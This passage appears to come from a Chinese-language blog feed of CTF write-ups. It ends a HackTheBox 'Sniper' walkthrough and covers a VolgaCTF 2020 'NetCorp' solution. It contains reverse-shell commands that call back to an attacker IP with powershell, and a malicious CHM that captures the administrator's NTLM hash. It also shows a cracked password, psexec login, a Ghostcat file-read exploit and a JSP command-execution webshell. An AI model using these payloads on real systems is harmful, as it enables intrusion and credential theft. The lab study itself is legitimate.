class="variable">$cred</span></span><br></pre></td></tr></table></figure><p>变量成功创建的话，最后一条命令的回显应该是<code>sniper\chris</code><br>然后下面的命令可以重新弹shell，得到usershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command -computer sniper -scriptblock &#123; c:\windows\temp\exp.exe 10.10.15.189 1234 -e powershell.exe &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>那么又到了最后的root提权时间。<br>在C:\docs中可以发现这样一个有趣的txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hi Chris,</span><br><span class="line">Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.</span><br><span class="line">And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.</span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br></pre></td></tr></table></figure><p>有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？<br>同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" alt><br>那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.windows本机下操作生成chm文件</span><br><span class="line">2.上传chm文件,其中payload将打到本机 #类似xss的道理</span><br><span class="line">3.监听本机，得到administrator信息。</span><br></pre></td></tr></table></figure><p>简单提下chm文件。其实就是html文件的帮助文件系统。而且想要操作起来很简单,只要在win10电脑的<code>C:\Program Files (x86)\HTML Help Workshop</code>中即可找到。<br>当然我们还要从微软官网下载最新的<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>先创建一个html文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hacked by byc_404&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=\\10.10.15.189\htb\23333.jpg/</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>里面的src资源指向我们本机任意资源，说白了就是让admin触发且我们能收到请求而已。<br>在windows本机以管理员权限打开hhw.exe，创建test.hpp项目添加我们刚刚的index.html并编译，即可生成一个chm文件。<br>然后回到本机,先起一个监听<br><code>responder -I tun0</code></p><p>wget上传文件到docs文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.15.189/test.chm -O exp.chm</span><br></pre></td></tr></table></figure><p>很快就能收到请求<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" alt><br>这是一串管理员密码的hash.到网站上解码可得管理员密码<code>butterfly!#1</code>.</p><p>然后登尝试登陆。由于开放了445端口，我们直接用smb服务可以直接登录。<br>当然我没有起smb服务，使用下面github上的python脚本即可替代。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket   </span><br><span class="line">pip install .</span><br><span class="line">python psexec.py Administrator@10.10.10.151</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" alt></p><p>成功拿到rootshell.</p><p>当然还有类似前面的直接反弹rootshell的方法。因为chm文件甚至可以插入powershell命令，所以我们可以直接生成反弹shell的html.这里直接借用看到的dalao的chm。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" alt><br>或者使用powershell命令生成payload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CHM –Payload <span class="string">"C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe"</span> –HHCPath “C:\Program Files (x86)\HTML Help Workshop”</span><br></pre></td></tr></table></figure><p>这样就能直接在administrator检查时反弹到shell.</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次windows靶机的体验还算不错。因为不熟悉的原因接触了不少新知识。有很多细节还没弄明白，但是也学到了不少windows靶机新知识。的确，CTFer 不能总是待在舒适区。国际赛也好，htb靶机渗透也好，都是接触非国内渗透知识的大好途径。毕竟也打了一段时间比赛了，国内的比赛除了大型比赛能有很多新姿势以及新想法学以外，其他的出题思路或者赛事操作都是老生常谈，拘泥于php或者个别trick的泥潭中。这几天尝试了java题，windows题，都算是一种突破常规的尝试吧。希望自己也能成为有想法的CTFer。而不是一个单纯的CTF赛棍.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020Qualifier复现</title>
      <link href="2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>比赛没有怎么认真打，但是毕竟题还是看了的。除了幽灵猫以外的题也是很有价值的，好好学习一波。</p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>这个周末最大的收获就是做了几道java题，对java题的相关套路有了一定了解。<br>比如此题，开始上来页面并无任何有用信息。唯一能做的从路由下手，这里不使用路径爆破工具的话，可以通过构造一些错误路径来尝试爆版本以及爆服务。这里在bp通过构造爆出了tomcat服务的相关信息。</p><a id="more"></a><p>而且访问<code>/docs</code>，得到apachetomcat信息,是9.0.24版本。基本确定是道java题，<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>接下来去搜索相关信息，发现了这样一个漏洞：<br>CVE-2020-1938 即tomcat的ghostcat漏洞<br>值得一提的是,ghostcat漏洞是由长亭爆出来的洞，GhostCat 主要是存在文件读取和包含漏洞<br>影响范围很广，几乎囊括了6-9版本。<br>我们又知道，文件上传+文件包含=RCE.因此尝试利用相关工具先进行文件读取，看看有无收获。<br>开始用的exp是这个<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a>,但是只能读文件不可执行命令。因此作罢。<br>我后来使用的exp来自<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a><br>这个exp不仅可以文件读取还可以包含，因此更适合</p><p>首先,对tomcat服务必读的文件就是<code>WEB-INF/web.xml</code><br>尝试读取<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru  8009  /WEB-INF/web.xml read</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>NetCorp<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeScreenshotServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeScreenshot<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">description</span>&gt;</span>Complaint info<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeComplaintServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeComplaint<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到除了404.html这样的页面还有两个类的信息。这里可以推断class文件的路径,通过反编译class文件，得到网站源码<br>我按照roarctf easyjava的经验构造路径,路径勉强算理解，好歹我也是java入门编程的…<code>WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class</code>，另一个同理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeComplaintServlet.class read -o complaint.class</span><br><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeScreenshotServlet.class read -o screenshoot.class</span><br></pre></td></tr></table></figure><p>反编译后得到以下源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeComplaintServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeComplaintServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeComplaintServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeScreenshotServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeScreenshotServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeScreenshotServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String appPath = request.getServletContext().getRealPath(<span class="string">""</span>);</span><br><span class="line">        String savePath = (<span class="keyword">new</span> StringBuilder()).append(appPath).append(<span class="string">"uploads"</span>).toString();</span><br><span class="line">        File fileSaveDir = <span class="keyword">new</span> File(savePath);</span><br><span class="line">        <span class="keyword">if</span>(!fileSaveDir.exists())</span><br><span class="line">            fileSaveDir.mkdir();</span><br><span class="line">        String submut = request.getParameter(<span class="string">"submit"</span>);</span><br><span class="line">        <span class="keyword">if</span>(submut != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(submut.equals(<span class="string">"true"</span>));</span><br><span class="line">        PrintWriter out = request.getParts().iterator();</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!out.hasNext())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            Part part = (Part)out.next();</span><br><span class="line">            String fileName = extractFileName(part);</span><br><span class="line">            fileName = (<span class="keyword">new</span> File(fileName)).getName();</span><br><span class="line">            String hashedFileName = generateFileName(fileName);</span><br><span class="line">            String path = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();</span><br><span class="line">            <span class="keyword">if</span>(!path.equals(<span class="string">"Error"</span>))</span><br><span class="line">                part.write(path);</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        out = response.getWriter();</span><br><span class="line">        response.setContentType(<span class="string">"application/json"</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        out.print(String.format(<span class="string">"&#123;'success':'%s'&#125;"</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">"true"</span></span><br><span class="line">        &#125;));</span><br><span class="line">        out.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateFileName</span><span class="params">(String fileName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s2;</span><br><span class="line">        StringBuilder sb;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">        md.update(fileName.getBytes());</span><br><span class="line">        <span class="keyword">byte</span> digest[] = md.digest();</span><br><span class="line">        s2 = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest)).toString(<span class="number">16</span>);</span><br><span class="line">        sb = <span class="keyword">new</span> StringBuilder(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count = <span class="number">32</span> - s2.length(); i &lt; count; i++)</span><br><span class="line">            sb.append(<span class="string">"0"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.append(s2).toString();</span><br><span class="line">        NoSuchAlgorithmException e;</span><br><span class="line">        e;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">extractFileName</span><span class="params">(Part part)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String contentDisp = part.getHeader(<span class="string">"content-disposition"</span>);</span><br><span class="line">        String items[] = contentDisp.split(<span class="string">";"</span>);</span><br><span class="line">        String as[] = items;</span><br><span class="line">        <span class="keyword">int</span> i = as.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            String s = as[j];</span><br><span class="line">            <span class="keyword">if</span>(s.trim().startsWith(<span class="string">"filename"</span>))</span><br><span class="line">                <span class="keyword">return</span> s.substring(s.indexOf(<span class="string">"="</span>) + <span class="number">2</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要内容在于<code>ServeScreenshotServlet</code>这个类。我们得到了上传文件的存在，也就是说可以通过上传+包含构造RCE了。<br>简单读下源码，其实就是指上传文件会传到<code>/upload</code>下，同时文件名变为上传文件名的md5值<br>直接使用curl传文件<br><code>curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot</code><br>myexp.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">String</span> disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>执行<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval</code><br><img src="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>注意到flag.txt的存在,那么直解更改命令上传后再次执行即可</p><p><img src="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 